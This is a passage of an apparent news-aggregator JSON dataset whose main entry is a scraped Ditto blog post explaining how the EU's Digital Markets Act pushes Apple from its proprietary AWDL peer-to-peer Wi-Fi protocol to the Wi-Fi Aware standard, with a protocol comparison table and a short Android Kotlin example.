      "ja": "エムダッシュ（—）は、文中の追加情報を区切るために使われ、カンマや括弧と似た役割を果たします。思考の変化や文の構造の中断を示すことができ、強調のためにカンマ、コロン、または括弧の代わりに使われることもあります。例やリストを導入する際に使われ、関連する節を劇的に結びつけることができます。また、会話の中での中断を示し、明確にする情報を強調することもあります。\n\nエンダッシュ（–）は、大文字の「N」の長さで、主に数の範囲（例えば、日付や時間）を示すために使われます。また、用語間のつながりを示す際にも用いられます（例：「スプリングフィールド–ウェブスターバーグ」）。範囲を示す際には「to」の代わりに使われ、特定の複合形容詞ではハイフンの代わりにもなります。\n\nハイフン（-）は、複合語の要素をつなげるために使われます（例：「ベーカリーオーナー」）。接頭辞や接尾辞を単語から分ける際にも用いられます（例：「プレベーカリー」）。日付の範囲を示したり、行の終わりで単語を分けたりするためにも使われます。また、会話の中でのどもりを示したり、単語を一文字ずつ綴ったりする際にも使われます。\n\n一般的なポイントとして、エムダッシュはコロンや括弧よりもカジュアルな印象を与えることがありますが、あらゆる文体で使うことができます。エムダッシュの周りのスペースは人によって異なり、スペースを入れることを好む人もいれば、ダッシュに近づけて書く人もいます。"
    }
  },
  {
    "id": "a5bb7b71df5c21ed",
    "title": {
      "en": "Cross-Platform P2P Wi-Fi: How the EU Killed AWDL",
      "ko": "EU가 AWDL을 죽인 이유",
      "ja": "EUがAWDLを葬った！"
    },
    "type": "story",
    "url": "https://www.ditto.com/blog/cross-platform-p2p-wi-fi-how-the-eu-killed-awdl",
    "score": 214,
    "by": "stusmall",
    "time": 1743167584,
    "content": "Published OnMarch 28, 2025March 28, 2025Cross-Platform P2P Wi-Fi: How the EU Killed AWDLThis post investigates how we got from Wi-Fi Direct to AWDL to Wi-Fi Aware, what makes Wi-Fi Aware technically superior, and why this shift unlocks true cross-platform peer-to-peer connectivity for developers.Adam FishFounder and CEO\n\npre {\n\t\t--theme--background: var(--core--100);\n    --theme--border: var(--swatch--light-faded);\n    --theme--border-fill: var(--core--100);\n    --theme--text: var(--core--800);\n    --theme--text-secondary: var(--core--400);\n\t\t--pre-text-main: var(--theme--text);\n    --pre-text-comment: color-mix(in srgb, var(--theme--text) 40%, transparent);\n    --pre-text-string: hsl(95, 38%, 62%);\n    --pre-text-keyword: hsl(286, 60%, 67%);\n    --pre-text-number: color-mix(in srgb, var(--theme--text) 60%, transparent);\n    --pre-text-attribute: color-mix(in srgb, var(--theme--text) 60%, transparent);\n    font-family: var(--eyebrow--font-family);\n    font-size: var(--text-main--font-size);\n    line-height: 1.5;\n    font-weight: var(--eyebrow--font-weight);\n    letter-spacing: var(--eyebrow--letter-spacing);\n    margin: 3em 0 !important;\n}\n\npre:has(code.hljs), pre {\n    overflow: clip;\n    padding: 0.75em !important;\n    background-color: var(--theme--background) !important;\n    white-space: pre-wrap;\n    color: var(--pre-text-main);\n}\n\npre code.hljs, pre code {\n    display: block;\n    overflow: auto;\n    height: 100%;\n    font-size: .875em;\n    font-family: var(--eyebrow--font-family);\n    font-weight: var(--eyebrow--font-weight);\n    letter-spacing: var(--eyebrow--letter-spacing);\n    padding: 0.875em;\n    color: var(--pre-text-main) !important;\n}\n\npre code::selection,\npre code span::selection {\n  background: color-mix(in srgb, var(--theme--text) 10%, transparent);\n}\n\npre code::-webkit-scrollbar {\n  width: 4px;\n  height: 4px;\n}\n\npre code::-webkit-scrollbar-corner {\n  background: rgba(0,0,0,0);\n  display: none;\n}\n\npre code::-webkit-scrollbar-track {\n  background: transparent;\n  padding: 2px;\n}\n\npre code::-webkit-scrollbar-thumb {\n  background-color: color-mix(in srgb, var(--theme--text) 25%, transparent);\n  border-radius: 999px;\n}\n\npre code::-webkit-scrollbar-thumb:hover {\n  background-color: color-mix(in srgb, var(--theme--text) 25%, transparent)\n}\n\n.hljs {\n    background: transparent;\n    color: var(--pre-text-main);\n}\n\n.hljs-ln-n {\n\topacity: 0.4;\n  font-family: var(--eyebrow--font-family);\n  font-weight: var(--eyebrow--font-weight);\n}\n\n.hljs-comment,\n.hljs-quote {\n    color: var(--pre-text-comment);\n    font-family: var(--eyebrow--font-family);\n    font-weight: var(--eyebrow--font-weight);\n}\n\n.hljs-deletion,\n.hljs-name,\n.hljs-regexp,\n.hljs-selector-class,\n.hljs-selector-id,\n.hljs-tag,\n.hljs-template-variable,\n.hljs-variable {\n    color: #ffa07a;\n    font-family: var(--eyebrow--font-family);\n    font-weight: var(--eyebrow--font-weight);\n}\n\n.hljs-built_in,\n.hljs-link,\n.hljs-literal,\n.hljs-meta,\n.hljs-number,\n.hljs-params,\n.hljs-type {\n    color: var(--pre-text-number);\n    font-family: var(--eyebrow--font-family);\n    font-weight: var(--eyebrow--font-weight);\n}\n\n.hljs-attribute {\n    color: var(--pre-text-attribute);\n    font-family: var(--eyebrow--font-family);\n    font-weight: var(--eyebrow--font-weight);\n}\n\n.hljs-addition,\n.hljs-bullet,\n.hljs-string,\n.hljs-symbol {\n    color: var(--pre-text-string);\n}\n\n.hljs-section,\n.hljs-title {\n    color: #F37243;\n    font-family: var(--eyebrow--font-family);\n    font-weight: var(--eyebrow--font-weight);\n}\n\n.hljs-keyword,\n.hljs-selector-tag {\n    color: var(--pre-text-keyword);\n    font-family: var(--eyebrow--font-family);\n    font-weight: var(--eyebrow--font-weight);\n}\n\n.hljs-emphasis {\n    font-style: italic\n}\n\n.hljs-strong {\n    font-weight: 700;\n    font-family: var(--eyebrow--font-family);\n}\n\n@media screen and (-ms-high-contrast:active) {\n\n    .hljs-addition,\n    .hljs-attribute,\n    .hljs-built_in,\n    .hljs-bullet,\n    .hljs-comment,\n    .hljs-link,\n    .hljs-literal,\n    .hljs-meta,\n    .hljs-number,\n    .hljs-params,\n    .hljs-quote,\n    .hljs-string,\n    .hljs-symbol,\n    .hljs-type {\n        color: highlight\n    }\n\n    .hljs-keyword,\n    .hljs-selector-tag {\n        font-weight: 700\n    }\n}\nTL;DR: Under pressure from the EU’s Digital Markets Act (DMA), Apple is being forced to ditch its proprietary peer-to-peer Wi-Fi protocol – Apple Wireless Direct Link (AWDL) – in favor of the industry-standard Wi-Fi Aware, also known as Neighbor Awareness Networking (NAN). A quietly published EU interoperability roadmap mandates Apple support Wi-Fi Aware 4.0 in iOS 19 and v5.0,1 thereafter, essentially forcing AWDL into retirement. This post investigates how we got here (from Wi-Fi Direct to AWDL to Wi-Fi Aware), what makes Wi-Fi Aware technically superior, and why this shift unlocks true cross-platform peer-to-peer connectivity for developers.EU Forces Apple’s Hand on Peer-to-Peer Wi-FiIn a little-publicized mandate, the European Commission explicitly requires Apple to implement the Wi-Fi Alliance’s Wi-Fi Aware standard as part of DMA interoperability measures. The official DMA roadmap states:“Apple shall implement the measures for Wi-Fi Aware 4.0 in the next major iOS release, i.e. iOS 19, at the latest, and for Wi-Fi Aware 5.0 in the next iOS release at the latest nine months following the introduction of the Wi-Fi Aware 5.0 specification”In plain terms, by the time iOS 19 ships, iPhones must support Wi-Fi Aware v4.0, and Apple must roll out v5.0 support soon after the Wi-Fi Alliance finalizes that spec.Crucially, this decision was not a voluntary announcement by Apple – it was imposed by regulators. Apple has kept quiet about these changes publicly, likely because they involve opening up formerly closed-off tech. The DMA enforcement timeline was highlighted in an EU Q&A site and legal annex, not an Apple press release.7 The European Commission’s language makes it clear this is about enabling third-party devices and apps to use high-bandwidth peer-to-peer (P2P) Wi-Fi features equal to Apple’s own, rather than Apple benevolently adopting a new standard. In fact, the EU order compels Apple to deprecate AWDL and ensure third-party solutions using Wi-Fi Aware are just as effective as Apple’s internal protocols. In short, the EU gave Apple no choice: embrace Wi-Fi Aware or face penalties.What does this mean? Essentially, Apple’s hidden sauce for fast device-to-device communication – AWDL – is being forced into retirement. And with that, for the first time, iPhones and Androids will speak a common language for local wireless networking. Let’s unpack how we got here, and why it’s a big deal for developers.From Wi-Fi Direct to AWDL to Wi-Fi Aware: A Brief HistoryTo understand the significance, we need a quick history of ad-hoc Wi-Fi protocols:Wi-Fi Ad-hoc (IBSS mode): Early 802.11 allowed devices to connect directly in a peer-to-peer “ad-hoc” network (IBSS), but it had limitations (no always-on discovery, no power-saving coordination, weak security). It never gained widespread use.Wi-Fi Direct: The Wi-Fi Alliance’s first big attempt at standard P2P. Wi-Fi Direct (circa 2010) allows devices to form a direct link without an AP, designating one device as a group owner (soft AP) for security and IP allocation. It improved on ad-hoc mode (supporting WPA2, dynamic group formation), but had drawbacks – e.g. limited service discovery capabilities and difficulty staying connected to infrastructure Wi-Fi concurrently.Apple Wireless Direct Link (AWDL): Around 2014, Apple developed AWDL as a proprietary, high-performance P2P Wi-Fi protocol for its ecosystem. According to Apple’s patent on AWDL (US20180083858A1) and reverse-engineering by researchers, AWDL was designed to address Wi-Fi Direct’s concerns and succeeded ad-hoc IBSS mode.8 Apple deployed AWDL in over a billion devices (every modern iPhone, iPad, Mac) to power AirDrop, AirPlay peer connections, GameKit, Apple Watch unlock, and more.8,9 Notably, AWDL can coexist with regular Wi-Fi by rapidly hopping channels – an iPhone can be on an AP and seamlessly switch to AWDL channel windows to talk to a peer.9 This gave AWDL low latency and high throughput without dropping your internet connection.Neighbor Awareness Networking (NAN / Wi-Fi Aware): As it turns out, Apple didn’t keep all of AWDL to itself – it contributed to the Wi-Fi Alliance, which adopted AWDL’s approach as the basis for the NAN standard (branded “Wi-Fi Aware”) around 2015.8 Wi-Fi Aware is essentially the industry-standard cousin of AWDL, enabling devices to discover each other and communicate directly with Wi-Fi speeds, in a power-efficient way, regardless of vendor. Android added platform support for Wi-Fi Aware in Oreo (8.0) and later,10 but Apple until now stuck with its in-house AWDL stack which can be used by developers but isn't an open standard.In summary, AWDL was Apple’s competitive edge – a proprietary P2P stack that outperformed legacy Wi-Fi Direct and only worked on Apple devices. If an app needed cross-platform local connectivity, it couldn’t use AWDL (Apple provides no raw AWDL API). Developers resorted to Wi-Fi Direct, or Wi-Fi Aware on Android vs. Apple’s AWDL on iOS, with no interoperability. This fragmentation is exactly what the EU’s DMA targeted.The DMA order effectively forces Apple to drop AWDL and align with Wi-Fi Aware. The Commission explicitly says Apple must“implement Wi-Fi Aware in iOS devices in accordance with the Wi-Fi Aware specification” and “continue to…improve the Wi-Fi Aware standard… Apple shall not prevent AWDL from becoming part of the Wi-Fi Aware standard”,even urging Apple to allocate memory for concurrent P2P on older devices in a non-discriminatory way until AWDL is fully deprecated.The writing is on the wall: AWDL as a private protocol is done for.Inside AWDL: Apple’s Once-Secret Peer-to-Peer ProtocolAWDL is worth a closer look, because it shows what Apple achieved and what will now be opened up via Wi-Fi Aware. How does AWDL work? In short, it creates a continuously syncing ad-hoc network on the fly among nearby Apple devices:Availability Windows & Channel Hopping: Each AWDL-enabled device periodically advertises Availability Windows (AWs) – tiny time slices when it’s available on a specific Wi-Fi channel for peer-to-peer communication.8 An elected master node (chosen via a priority scheme) coordinates these windows across devices. Outside of these AWs, devices can rejoin normal Wi-Fi (e.g. your home router’s channel) or sleep their radio to save power.8 This scheduling is what allows, let's say, your Mac to be on Wi-Fi for internet most of the time, but briefly switch to channel 6 to AirDrop a file from your iPhone, then switch back – all without manual intervention.Integration with BLE: AWDL doesn’t work in isolation – it integrates with Bluetooth Low Energy for discovery. For example, AirDrop uses BLE advertisements to initially discover nearby devices (showing them in the UI), then quickly forms an AWDL connection for the actual high-speed file transfer. This combo gives the best of both: BLE’s low-power device discovery and AWDL’s high-throughput data channel.11,12Performance: AWDL leverages the full Wi-Fi PHY, so it can hit hundreds of Mbps throughput and sub-second latencies that BLE or classic Bluetooth can’t touch. It also supports robust security (authenticated pairing, encryption) as used in AirDrop/AirPlay. One clever feature: because AWDL devices coordinate their availability, one device can even sustain multiple P2P links concurrently (e.g. an iPhone streaming to a HomePod via AWDL while also AirDropping to a Mac) – something spelled out in the EU requirements.Closed Nature: Despite its capabilities, AWDL has been closed off to third-party developers and other OSes. Apple’s APIs like MultipeerConnectivity framework ride on AWDL under the hood for Apple-to-Apple connections, but there was no way for an Android device or a Windows laptop to speak AWDL. It was an Apple-only club. Researchers at TU Darmstadt’s Secure Mobile Networking Lab had to reverse-engineer AWDL (publishing an open Linux implementation called OWL) to document its inner workings.13 They demonstrated that AWDL indeed is an IEEE 802.11-based ad-hoc protocol with Apple-specific extensions, tightly integrated with Apple’s ecosystem.14 Bottom line: AWDL gave Apple a technical edge but at the cost of interoperability – a classic “walled garden” approach.It’s this walled garden that the EU is breaking down. The mandate that “Apple shall make Wi-Fi Aware available to third parties” means Apple must expose new iOS APIs for P2P connectivity that are standard-based. And since Android (and even some IoT devices) already support Wi-Fi Aware, we’re headed for a world where an iPhone and an Android phone can find and connect to each other directly via Wi-Fi, no access point, no cloud, no hacks – a scenario that AWDL alone never allowed.Wi-Fi Aware 4.0: The New Cross-Platform StandardSo what exactly is Wi-Fi Aware (a.k.a. NAN), and why is version 4.0 a game-changer? At a high level, Wi-Fi Aware offers the same kind of capabilities as AWDL, but as an open standard for any vendor. It lets devices discover each other and exchange data directly via Wi-Fi, without needing a router or cell service. Think of it as Wi-Fi’s answer to Bluetooth discovery but with Wi-Fi speed and range. Some key technical features of Wi-Fi Aware (especially in the latest v4.0 spec) include:Continuous, Efficient Discovery: Devices form a Wi-Fi Aware group and synchronize wake-up times to transmit Discovery Beacons. Like AWDL’s AWs, Wi-Fi Aware defines Discovery Windows where devices are active to find peers, then can sleep outside those windows to save power. This allows always-on background discovery with minimal battery impact.15 The latest spec enhances this with an “Instant Communication” mode – a device can temporarily accelerate discovery (e.g. switch to a channel and beacon rapidly) when triggered by an external event like a BLE advertisement or NFC tap, to achieve very fast discovery and connection setup.16 In practice, that means an app can use BLE to wake up Wi-Fi (advertising a service via BLE then negotiating a NAN link), combining the energy efficiency of BLE with the speed of Wi-Fi – just as Apple’s AirDrop has done privately. Wi-Fi Aware v4.0 explicitly added standardized BLE co-operation: “Latest enhancements to Wi-Fi Aware offer discovery by Bluetooth LE, which triggers a formal Wi-Fi Aware session by waking the Wi-Fi radio.”10High Throughput Data & Range: Once devices discover each other, Wi-Fi Aware supports establishing a direct Wi-Fi data path. This can be an IP connection or a native transport, and it leverages Wi-Fi’s high data rates (including Wi-Fi 5/6/6E speeds on 5 GHz or 6 GHz bands). In fact, the Wi-Fi Alliance notes that Wi-Fi Aware data connections use “high performance data rates and security, leveraging cutting-edge Wi-Fi technologies, including Wi-Fi 6, Wi-Fi 6E, and WPA3.” 10 Compared to Bluetooth or BLE, the throughput and range are vastly superior – Wi-Fi Aware can work at typical Wi-Fi ranges (tens of meters, even over 100m in open air) and deliver tens or hundreds of Mbps. By contrast, BLE might get 100+ meters but on the order of 0.1 Mbps in real-world throughput. Wi-Fi Aware will close that gap by giving cross-platform apps both long range and high speed.Lower Latency & Instant Communication: Version 4.0 of the spec introduced refinements for latency-critical applications. The aforementioned Instant Communication mode lets devices expedite the discovery handshake – important for use cases like AR gaming or urgent data sync where waiting a few seconds for a discovery window might be too slow. In Instant mode, a device (say, an AR headset) triggered via BLE could immediately switch to a predetermined channel and begin a quick service discovery exchange with a peer, rather than strictly waiting on the periodic timetable.16 The spec shows this can cut discovery latency dramatically (Figure 73 in the spec illustrates an accelerated discovery).16 From a developer’s perspective, Wi-Fi Aware can feel nearly instantaneous in establishing a link when properly used.Accurate Ranging: Perhaps one of the most exciting features for version 4 and beyond is built-in distance measurement between devices. Wi-Fi Aware includes a ranging protocol (based on Fine Timing Measurement, FTM) that lets one device get the distance to another with sub-meter accuracy.15 This is similar to how Apple devices can use UWB or Bluetooth RTT for ranging, but now via Wi-Fi. The devices exchange precise timing signals to calculate distance (and even do so as part of discovery – a NAN discovery packet can include a request to measure range). The spec’s NAN Ranging section defines how devices negotiate a ranging session and obtain a distance estimate before or during data exchange.16 Enhanced ranging could unlock things like peer-to-peer localization (for example, an app can find not just who is nearby but also roughly how far or even what direction).Security and Privacy: Wi-Fi Aware has baked-in solutions for secure communication and privacy. It supports device pairing (establishing trust and keys) and encrypted data paths with mutual authentication.15 It also provides privacy features like randomized identifiers that rotate, so devices aren’t broadcasting a fixed MAC or identity constantly.10 This addresses the concern that always-on discovery could be used to track devices – Aware can randomize its “NAN IDs” and only reveal a stable identity when a trusted handshake occurs. The EU mandate will require Apple to expose the same security levels to third-party developers as it uses for its own devices, meaning things like AirDrop’s peer authentication should extend to third-party Aware sessions.In essence, Wi-Fi Aware 4.0 is AWDL on steroids and open to all. It took the concepts Apple pioneered (timeslot synchronization, dual Wi-Fi/BLE use, etc.) and formalized them into a cross-vendor standard, adding improvements along the way. No longer limited to Apple devices, any Wi-Fi Aware certified device can join the discovery clusters and connect. With iOS 19, an iPhone will become just another Wi-Fi Aware node – able to discover and connect to Android phones, PCs, IoT gadgets, etc., directly via Wi-Fi.AWDL vs. Wi-Fi Aware vs. BLE: Feature ComparisonHow does Apple’s AWDL, the upcoming Wi-Fi Aware, and good old Bluetooth Low Energy stack up? The table below summarizes the key differences and capabilities of these peer-to-peer wireless technologies:\n.table_component {\n    overflow: auto;\n    width: 100%;\n}\n\n.table_component table {\n    border: 1px solid #dededf;\n    height: 100%;\n    width: 100%;\n    table-layout: fixed;\n    border-collapse: collapse;\n    border-spacing: 1px;\n    text-align: left;\n}\n\n.table_component caption {\n    caption-side: top;\n    text-align: left;\n}\n\n.table_component th {\n    border: 1px solid #dededf;\n    background-color: #eceff1;\n    color: #000000;\n    padding: 5px;\n}\n\n.table_component td {\n    border: 1px solid #dededf;\n    background-color: #ffffff;\n    color: #000000;\n    padding: 5px;\n}\n\n            Feature\n            Apple AWDL (Proprietary)\n            Wi-Fi Aware 4.0 (2022 Spec)\n            Bluetooth LE (5.x)\n\n            Standardization\n\n                Apple-defined (private protocol)\n\n                Wi-Fi Alliance NAN standard\n\n                Bluetooth SIG standard\n\n            Topology\n\n                Mesh networking. Multiple devices in a cluster. One acts as a time sync master.\n\n                Decentralized cluster (no fixed master). Typically one-to-one data links, but multiple links supported.\n\n                Point-to-point or star (one-to-many, each connection 1:1). No native mesh routing.\n\n                Discovery Mechanism\n\n                AWDL frames (Wi-Fi beacons), BLE-assisted initial discovery (e.g., AirDrop).\n\n                Publish/Subscribe discovery with NAN frames. Supports out-of-band BLE wake-up for power saving.\n\n            BLE Advertising channels, low-power continuous advertising, and scanning.\n\n                Initial Connection Latency\n\n                Very fast (<1s) using BLE assist (AirDrop). Quick AWDL link setup.\n\n                Fast (<1s typical) discovery, tens of ms connection setup after discovery.\n\n                Fast discovery (~0.5–1s). Connection establishment latency (50–100 ms).\n\n                Data Throughput\n\n                High – 160–320 Mbps real-world (AirDrop). Wi-Fi 5/6 speeds.\n\n                High – 100+ Mbps real-world on Wi-Fi 5 hardware, 250+ Mbps possible on Wi-Fi 6.\n\n                Low – Max ~1.36 Mbps app throughput (BLE 5), typically 0.2–0.5 MB/s.\n\n            Range\n\n                ~50–100m typical Wi-Fi range. 100m+ line-of-sight.\n\n                ~50–100m typical Wi-Fi range, similar to AWDL.\n\n                Up to 100–200m typical; max ~1km line of sight with BLE 5 long-range (coded PHY).\n\n                Concurrent Internet\n\n                Yes – simultaneous infrastructure Wi-Fi and P2P via channel hopping.\n\n            Yes – NAN discovery windows are scheduled around AP connectivity. Coexistence supported.\n\n                Yes – BLE separate from Wi-Fi, runs in parallel.\n\n                Notable Features\n\n                Proprietary; Powers AirDrop/AirPlay; Mesh with master; No direct public API (apps use Multipeer Connectivity).\n\n                Open standard; Flexible discovery; Instant messaging; Built-in secure data path setup; Android API since 2017.\n\n                Universally supported; Extremely energy-efficient; Background presence detection; Limited data rate. Often combined with Wi-Fi for bulk transfer.\n\n(Note: Above ranges and throughput are based on Ditto’s real-world tests and specification data. Bluetooth 5's theoretical 4x range increase can reach ~400m line-of-sight, typical usable range 100–200m indoors. Wi-Fi range varies significantly with the environment.)As the table shows, Wi-Fi Aware (NAN) and AWDL are closely matched in capabilities – no surprise, given their kinship. Both vastly outperform Bluetooth LE for high-bandwidth applications, though BLE remains invaluable for ultra-low-power needs and simple proximity detection. The sweet spot that AWDL and Aware occupy is: fast, local data exchange (from tens of megabits up to hundreds) over distances of a room or building floor, without requiring any network infrastructure. This is why forcing Apple to support Wi-Fi Aware is so pivotal – it means an iPhone and an Android phone sitting next to each other can finally establish a fast, direct Wi-Fi link without an access point, something that was previously impossible (because the iPhone would only speak AWDL, and the Android only Wi-Fi Aware/Wi-Fi Direct). In effect, the EU is unifying the table’s middle column (“Wi-Fi Aware”) across the industry, and pushing the proprietary AWDL column toward obsolescence.A Glimpse of Wi-Fi Aware 5.0 – What’s Next?The EU is already looking ahead to Wi-Fi Aware 5.0, mandating Apple support it when available. While v5.0 is still in the works, we can speculate based on industry trends and draft discussions:Better Interoperability & Backwards Compatibility: Each iteration of Aware aims to bring improvements while remaining backward compatible. v5.0 will likely fine-tune the interaction between different versions (e.g. allowing a v5 device to gracefully communicate with a v4 device at a slightly reduced feature set).Multi-Band and Wi-Fi 7 Enhancements: With Wi-Fi 7 (802.11be) emerging, v5.0 could incorporate support for Multi-Link Operation (MLO) – allowing Aware devices to use multiple bands or channels simultaneously for P2P, increasing reliability and throughput. It might also embrace new PHY capabilities like 320 MHz channels in 6 GHz or even integration of the 60 GHz band for ultra-high throughput at short range. Imagine a future Aware where two devices use 6 GHz for discovery and 60 GHz for a quick gigabit data burst.Improved Ranging and Location: Wi-Fi Aware might leverage Wi-Fi 7’s improved location features or even integrate with UWB. v5.0 could offer finer distance measurement or angle-of-arrival info by coordinating multiple antennas, which would interest AR/VR use cases and precise indoor positioning.Extended Mesh Networking: Currently, Aware focuses on finding peers and setting up links; v5.0 might add more mesh networking primitives – e.g., forwarding data through intermediate nodes or coordinating groups of devices more intelligently. This could turn clusters of phones into true mesh networks for group connectivity without infrastructure.Security Upgrades: Each version updates security. v5.0 will likely address any weaknesses found in v4, perhaps adding quantum-resistant encryption for pairing or tighter integration with device identity frameworks. Given Apple’s emphasis on privacy, expect them to push for features that allow secure sharing of connection metadata with third parties without exposing user data.We’ll know for sure once the Wi-Fi Alliance releases the Wi-Fi Aware 5.0 spec, but the direction is clear: faster, farther, and more seamless peer-to-peer connectivity. And importantly, Apple will be on board from day one (not years late as it was with previous standards).Wi-Fi Aware in Action: Android Kotlin ExampleTo illustrate how developers can use Wi-Fi Aware, let’s look at a simplified real-world example on Android. Below is Kotlin code demonstrating a device publishing a service and handling a message from a subscriber. (Android’s Wi-Fi Aware API is available from API level 26; one must have location and “Nearby Wi-Fi Devices” permissions, and the device must support Aware.)val wifiAwareMgr = context.getSystemService(Context.WIFI_AWARE_SERVICE) as WifiAwareManager\n\nif (!wifiAwareMgr.isAvailable) {\n    Log.e(\"WiFiAwareDemo\", \"Wi-Fi Aware not available on this device.\")\n    return\n}\n\n// Attach to the Wi-Fi Aware service\nwifiAwareMgr.attach(object : AttachCallback() {\n    override fun onAttached(session: WifiAwareSession) {\n        // Once attached, we can publish or subscribe\n        val publishConfig = PublishConfig.Builder()\n            .setServiceName(\"com.example.p2pchat\")    // Name of our service\n            .build()\n\n        session.publish(publishConfig, object : DiscoverySessionCallback() {\n            override fun onPublishStarted(pubSession: PublishDiscoverySession) {\n                Log.i(\"WiFiAwareDemo\", \"Service published, ready for subscribers.\")\n            }\n\n            override fun onMessageReceived(\n                session: DiscoverySession,\n                peerHandle: PeerHandle,\n                message: ByteArray\n            ) {\n                val msgStr = String(message, Charsets.UTF_8)\n                Log.i(\"WiFiAwareDemo\", \"Received message from subscriber: $msgStr\")\n                // Here we could respond or establish a data path if needed\n            }\n        }, null)\n    }\n\n    override fun onAttachFailed() {\n        Log.e(\"WiFiAwareDemo\", \"Failed to attach to Wi-Fi Aware session.\")\n    }\n}, null)\nIn this code, the app attaches to the Wi-Fi Aware service, then publishes a service named \"com.example.p2pchat\". When a peer subscribes and sends us a message (for example, “Hello from subscriber”), it arrives in onMessageReceived. A subscriber device would perform complementary steps: calling session.subscribe(...) with the same service name and implementing onServiceDiscovered to detect the publisher, then possibly using subscribeSession.sendMessage(peer, ...) to send that “Hello.” At that point, either side could then use WifiAwareSession.createNetworkSpecifier() to set up an actual data path (network interface) for larger communication.The key takeaway is that Wi-Fi Aware makes peer discovery and messaging a first-class citizen in the API, abstracting away the low-level Wi-Fi fiddling. The app developer just provides a service name and gets callbacks when peers appear or messages arrive.(Note: The above is a minimal example. In a real app, you’d handle permissions, check for support via PackageManager.FEATURE_WIFI_AWARE, and probably use the new NEARBY_WIFI_DEVICES permission on Android 13+. Also, establishing a full data path would involve requesting a Network from ConnectivityManager with a network specifier from the Aware session.)Immediately after Google announced Wi-Fi Aware in Android, we at Ditto realized its potential for seamless peer-to-peer sync. As shown above, you can certainly roll your own discovery and data exchange with Aware. However, not every developer will want to manage these details or deal with corner cases of connectivity. That’s why Ditto’s real-time sync SDK is integrating Wi-Fi Aware support out-of-the-box.Our upcoming releases will automatically use Wi-Fi Aware in iOS under the hood for nearby devices, enabling peer-to-peer database synchronization and binary file sharing between iOS and Android with zero configuration. In practical terms, if you build your app with Ditto, two devices in proximity will be able to find each other and sync data directly (bypassing cloud or LAN) using the fastest available transport – now including Wi-Fi Aware alongside Bluetooth, AWDL, LAN, etc.Cross-platform, edge-first applications (collaborative apps, offline-first data stores, local IoT networks) will significantly benefit from this, as devices will form a local mesh that syncs instantly and reliably, even if the internet is down. Ditto’s approach has always been to multiplex multiple transports (Wi-Fi infrastructure, P2P, BLE, etc.) for robustness; adding NAN support supercharges the bandwidth available for nearby sync sessions.A concrete example: Consider an app for first responders that shares maps and live sensor data among a team in the field. With Wi-Fi Aware, an Android tablet, an iPhone, and a specialized helmet device could all auto-discover each other and form a mesh to sync mission data in real-time without any network. Previously, if the iPhone had an app using AWDL, it couldn’t directly connect to the Android tablet’s Wi-Fi Aware session – they were incompatible silos. Now, they’ll speak one language, making such scenarios truly feasible.Bigger Picture: The Dawn of True Cross-Platform Mesh NetworkingApple’s reluctant adoption of Wi-Fi Aware marks a pivot point for device connectivity. For years, we’ve seen a split: Apple’s ecosystem “Just Works” within itself (thanks to AWDL, AirDrop, etc.), while other platforms muddled along with standards that never quite matched the seamlessness or performance. That left cross-platform interactions hamstrung – the experience of sharing something between an iPhone and an Android was far from instant or easy.With iOS supporting Wi-Fi Aware, we’re essentially witnessing AWDL go open. The proprietary tech that powered some of Apple’s most magical features will now be available in an interoperable way to any developer. The implications are significant:End of the Proprietary P2P Divide: No more need for parallel implementations. Developers won’t have to build one system using MultipeerConnectivity for iOS-to-iOS and another using Wi-Fi Aware or Wi-Fi Direct for Android-to-Android. They can use Wi-Fi Aware universally for nearby networking. This reduces development complexity and encourages building features that work on all devices, not just within one brand.Cross-Platform AirDrop and Beyond: We will likely see apps (or OS-level features) that enable AirDrop-like functionality between iOS and Android. Google’s Nearby Share and Samsung’s Quick Share could potentially become interoperable with Apple’s implementation now that the underlying protocol is shared. The user experience barrier between ecosystems could start to blur in local sharing scenarios.Mesh and Edge Computing Potential: If many devices can seamlessly form ad-hoc networks, this enables new paradigms in edge computing. Clusters of phones could share workload or content directly. For example, at a conference, a presenter’s laptop could broadcast slides via Wi-Fi Aware to all audience phones without internet. Or a fleet of drones could coordinate via Aware when out of range of a base station. The offline mesh becomes a first-class citizen.Competitive Innovation: The EU’s push here also sets a precedent – even giants like Apple must conform to interoperability on critical features. This may drive Apple (and others) to innovate on top of the standards rather than via proprietary lock-in. We might see Apple contribute more actively to Wi-Fi Aware’s future improvements (as required by the DMA) to ensure it meets their needs for things like AR/VR data streams. That collaboration could yield better tech for everyone, faster.One can’t ignore the irony that the Wi-Fi Aware standard is effectively a child of AWDL. Now the child comes back to replace its parent. From a technical perspective, this is a win for engineering elegance – it’s always cleaner to have one agreed-upon protocol rather than parallel ones. From a developer perspective, it’s a huge win for interoperability and user reach.Apple will undoubtedly ensure that the transition doesn’t degrade the experience for Apple-to-Apple interactions; the DMA even mandates that third-party access be “equally effective” as Apple’s own solutions. That means as developers, we should expect the new iOS 19 Wi-Fi Aware APIs to give us essentially what AWDL gave Apple’s apps. It’s like being handed the keys to a supercar that was previously locked in Apple’s garage.ConclusionThe EU’s crackdown on Apple’s closed ecosystems is catalyzing a long-awaited unification in short-range wireless technology. By compelling Apple to adopt Wi-Fi Aware, the Digital Markets Act is effectively forcing the end of AWDL as an exclusive domain. For developers and users, this is exciting news: soon your apps will be able to use high-speed peer-to-peer Wi-Fi on iPhones and have it talk to other platforms seamlessly. We’ll likely see an explosion of innovative uses for local connectivity – from truly universal AirDrop alternatives to cross-platform local multiplayer games, ad-hoc collaborative editing, IoT device commissioning, and beyond – no specialized hardware or router required.At a technical level, AWDL will be remembered as an ahead-of-its-time solution that proved what was possible, and Wi-Fi Aware ensures those capabilities are broadly available as an industry standard. With Wi-Fi Aware 4.0 on the cusp of ubiquity (and 5.0 on the horizon), we are entering a new era of frictionless sharing and syncing among devices in physical proximity. It’s a win for interoperability and a win for innovation in peer-to-peer networking. The walls around AWDL are coming down – and the implications for edge computing and offline experiences are profound.‍Sources:[1] European Commission – DMA Decisions on Apple Interoperability (Q&A) – High-bandwidth P2P Wi-Fi (Wi-Fi Aware 4.0 in iOS 19, Wi-Fi Aware 5.0 next). (2025) (Interoperability - European Commission)[2] The Apple Wiki – Apple Wireless Direct Link (AWDL) – Proprietary mesh protocol introduced in iOS 7 (2014) for AirDrop/Continuity. (Apple Wireless Direct Link - The Apple Wiki) (Apple Wireless Direct Link - The Apple Wiki)[3] ZDNet – Apple’s AWDL protocol plagued by flaws… – Research note: “NAN (Wi-Fi Aware) is a new standard supported by Android which draws on AWDL’s design.” (Nov 2019) (Apple's AWDL protocol plagued by flaws that enable tracking and MitM attacks | ZDNET)[4] Android AOSP Documentation – Wi-Fi Aware feature (Neighbor Awareness Networking) – Added in Android 8.0; supports discovery, connection, and ranging (added in Android 9). 